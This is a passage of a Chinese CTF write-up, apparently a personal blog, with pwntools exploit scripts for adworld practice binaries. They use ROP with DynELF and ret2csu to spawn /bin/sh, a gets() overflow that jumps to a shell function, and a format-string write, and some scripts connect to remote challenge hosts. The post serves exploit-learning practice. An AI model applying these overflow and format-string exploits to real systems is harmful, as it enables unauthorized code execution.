</span></span></code></pre></div><p>No matched libc, please add more libc or try others</p><p>不太行，而且好像传输过程中有一些奇怪的字符</p><h2 id=方法二利用dynelf>方法二：利用DynELF</h2><p>利用DynELF函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;terminator&#39;</span><span class=p>,</span><span class=s1>&#39;-x&#39;</span><span class=p>,</span><span class=s1>&#39;sh&#39;</span><span class=p>,</span><span class=s1>&#39;-c&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;pwn100&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;pwn100&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts_plt_addr</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span><span class=o>=</span><span class=mh>0x0000000000400763</span> 
</span></span><span class=line><span class=cl><span class=c1>#main_addr=0x00000000004006B8</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span><span class=o>=</span><span class=mh>0x400550</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>address</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>address</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>puts_plt_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;bye~</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>up</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>numb</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>up</span><span class=o>==</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=ow>and</span> <span class=n>c</span><span class=o>==</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=o>+=</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=o>+=</span><span class=n>c</span>
</span></span><span class=line><span class=cl>        <span class=n>up</span><span class=o>=</span><span class=n>c</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dyn</span><span class=o>=</span><span class=n>DynELF</span><span class=p>(</span><span class=n>leak</span><span class=p>,</span><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;pwn100&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sys_addr</span><span class=o>=</span><span class=n>dyn</span><span class=o>.</span><span class=n>lookup</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>,</span><span class=s1>&#39;libc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sys_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bss_addr</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1>#bss_addr=0x0000000000601050</span>
</span></span><span class=line><span class=cl><span class=n>read_plt_addr</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>read_got_addr</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#ret2rsu</span>
</span></span><span class=line><span class=cl><span class=n>pop_6_addr</span><span class=o>=</span><span class=mh>0x000000000040075A</span>
</span></span><span class=line><span class=cl><span class=n>mov_rdx_r13</span><span class=o>=</span><span class=mh>0x0000000000400740</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_6_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>read_got_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=n>mov_rdx_r13</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;c&#39;</span><span class=o>*</span><span class=mi>56</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>sys_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=重要结论本地失败了请直接尝试云端环境>重要结论:本地失败了请直接尝试云端环境</h2><p>一直在调试本地，不知道为什么一直失败，想着是代码问题，后面直接用他的云端环境，一下子就成功了，就无语</p><h1 id=反应釜开关控制>反应釜开关控制</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-240h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [sp+40h] [bp-200h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Please closing the reaction kettle</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0x23uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;The switch is:&#34;</span><span class=p>,</span> <span class=mh>0xEuLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=s>&#34;%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>easy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>9uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;&gt;&#34;</span><span class=p>,</span> <span class=mi>2uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>,</span> <span class=s>&#34;&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>一运行直接到gets了，想不到该怎么Pwn,看答案</p><p>Gets函数的溢出，直接可以覆盖RIP，跳转到我们想要执行的地址</p><p>溢出字符多试试</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span> 
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>=</span><span class=nf>process</span><span class=p>(</span><span class=err>&#39;</span><span class=p>.</span><span class=o>/</span><span class=n>fyf</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>=</span><span class=nf>remote</span><span class=p>(</span><span class=err>&#39;</span><span class=mf>111.198.29.45</span><span class=err>&#39;</span><span class=p>,</span><span class=mi>36983</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=nf>ELF</span><span class=p>(</span><span class=err>&#39;</span><span class=p>.</span><span class=o>/</span><span class=n>fyf</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>getshell_addr</span><span class=o>=</span><span class=n>elf</span><span class=p>.</span><span class=n>sym</span><span class=p>[</span><span class=err>&#39;</span><span class=n>shell</span><span class=err>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x208</span><span class=o>+</span><span class=nf>p64</span><span class=p>(</span><span class=n>getshell_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=sc>&#39;&gt;&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h1 id=实时数据检测>实时数据检测</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>r</span>
</span></span><span class=line><span class=cl><span class=n>Starting</span> <span class=nl>program</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>vincebye</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=n>datamo</span><span class=o>/</span><span class=n>datamo</span> 
</span></span><span class=line><span class=cl><span class=n>AAAA</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>AAAA</span><span class=o>-</span><span class=mh>0xf7feade0</span><span class=o>-</span><span class=mh>0xf7e4511b</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0xf7fb7000</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0xffffd0d8</span><span class=o>-</span><span class=mh>0x80484e7</span><span class=o>-</span><span class=mh>0xffffced0</span><span class=o>-</span><span class=mh>0x200</span><span class=o>-</span><span class=mh>0xf7fb75c0</span><span class=o>-</span><span class=mh>0xf7fda19b</span><span class=o>-</span><span class=mh>0x41414141</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0xc3000a</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0xf7ffd000</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0x1a59e700</span><span class=o>-</span><span class=mh>0x9</span><span class=o>-</span><span class=mh>0xffffd34d</span><span class=o>-</span><span class=mh>0xf7e0f589</span><span class=o>-</span><span class=mh>0xf7fba808</span><span class=o>-</span><span class=mh>0xf7fb7000</span><span class=o>-</span><span class=mh>0xf7fb7000</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0xf7e0f6eb</span><span class=o>-</span><span class=mh>0xf7fb73fc</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0x804859b</span><span class=o>-</span><span class=mh>0x1</span><span class=o>-</span><span class=mh>0xffffd194</span><span class=o>-</span><span class=mh>0xffffd0e8</span><span class=o>-</span><span class=mh>0x804853c</span><span class=o>-</span><span class=mh>0xf7fe5970</span>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>location</span> <span class=n>of</span> <span class=n>key</span> <span class=n>is</span> <span class=mi>0804</span><span class=n>a048</span><span class=p>,</span> <span class=n>and</span> <span class=n>its</span> <span class=n>value</span> <span class=n>is</span> <span class=mo>00000000</span><span class=p>,</span><span class=n>not</span> <span class=n>the</span> <span class=mh>0x02223322</span><span class=p>.</span> <span class=p>(</span><span class=err>╯°Д°</span><span class=p>)</span><span class=err>╯︵</span> <span class=err>┻━┻</span>
</span></span></code></pre></div><p>很明显，可以根据printf字符串格式化漏洞，在0804a048处写入0x02223322，AAAA在偏移12的地方</p><p>那尝试一下这个payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mi>0804</span><span class=n>a048</span><span class=o>-%</span><span class=mi>35795746</span><span class=n>c</span><span class=o>%</span><span class=mi>12</span><span class=o>%</span><span class=n>n</span>
</span></span></code></pre></div><p>失败了，不知道如何指定地址，AAAA对应0x41414141，但是不知怎么弄出0x0804a048</p><p>看了答案总结几个失败点</p><ul><li>手动输入H\xa0\x040和用代码发送结果不一样，手动输入是按照字符串解析的，下次优先按照代码</li><li>pwntool库里有一个fmtstr_payload函数，学习一下</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>####################################
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=nf>process</span><span class=p>(</span><span class=s>&#34;./datamo&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>=</span><span class=nf>remote</span><span class=p>(</span><span class=err>&#39;</span><span class=mf>111.200.241.244</span><span class=sc>&#39;,&#39;</span><span class=mi>56461</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key_addr</span> <span class=o>=</span> <span class=mh>0x0804A048</span>
